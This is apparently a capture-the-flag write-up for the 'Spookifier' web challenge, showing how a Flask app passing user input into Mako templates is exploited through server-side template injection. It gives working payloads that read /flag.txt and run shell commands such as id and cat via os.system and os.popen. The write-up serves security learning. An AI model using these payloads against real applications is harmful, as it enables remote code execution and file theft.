## Challenge Description
There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?

# Solution

Navigating to website, we are presented with the following page.

![spk-1](https://user-images.githubusercontent.com/87711310/211197353-15ef535d-d778-42b2-ab59-e52d695fc741.png)

Looking into the source code reveals that it’s a `flask` app and using `mako` template engine for rendering. On line 11, the user input is passed into the spoofiky function and it’s output is passed into the template.

```javascript
┌──(darshan㉿kali)-[~/…/web_spookifier/challenge/application/blueprints]
└─$ cat routes.py           
from flask import Blueprint, request
from flask_mako import render_template
from application.util import spookify

web = Blueprint('web', __name__)

@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html',output=converted)
    
    return render_template('index.html',output='')
```

Tracing the spookify function, it passes the text onto `change_font` function which just maps the text characters againts different font dictionaries.

```python

def change_font(text_list):
        text_list = [*text_list]
        current_font = []
        all_fonts = []

        add_font_to_list = lambda text,font_type : (
                [current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear()
                ) and None

        add_font_to_list(text_list, 'font1')
        add_font_to_list(text_list, 'font2')
        add_font_to_list(text_list, 'font3')
        add_font_to_list(text_list, 'font4')

        return all_fonts

def spookify(text):
        converted_fonts = change_font(text_list=text)

        return generate_render(converted_fonts=converted_fonts)

```

One fond dictionary does not have any unique character for mapping.


```python
...
font4 = {
        'A': 'A', 
        'B': 'B',
        'C': 'C',
        'D': 'D',
        ........
```

Since, the user input is directly passed into the template without any sanitization, this introduces the chances of carrying out `Server Side Template Injection` (SSTI) attacks.

We confirm it by using the following payload and it sucessfully evaluates it.

![spk-2](https://user-images.githubusercontent.com/87711310/211248331-02810b1b-1a05-40d6-9156-d54c5eedc8a6.png)

## Solution-1
Since we know that this web-app is vulnerable to `SSTI`, i googled a couple of payloads to read contents of a file and I found this payload

```
${open('/flag.txt').read()}
```

![spk-3](https://user-images.githubusercontent.com/87711310/211248947-da5504b9-568c-4265-b2e7-b9f16b562749.png)

## Solution-2
I started intercepting the traffic through `Burp` and started by using generic and basic `SSTI` payloads.


After this, I found a SSTI payload from `Payload All the Things'` [Github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#mako)

The payload that I used was for the `Mako` template library to get `Direct access to OS from TemplateNamespace`

```
${self.__init__.__globals__['util'].os.system('id')}
```

![spk-5](https://user-images.githubusercontent.com/87711310/211251011-f903c0fb-911c-4458-995f-1b27181bc8fe.png)

After this, I figured out a payload to read the contents of the file using `module.cache.util`

```
${self.module.cache.util.os.popen('cat /flag.txt').read()}
```

![spk-6](https://user-images.githubusercontent.com/87711310/211251015-a26042d4-85ae-49a9-84ff-f4da2b6e520b.png)  



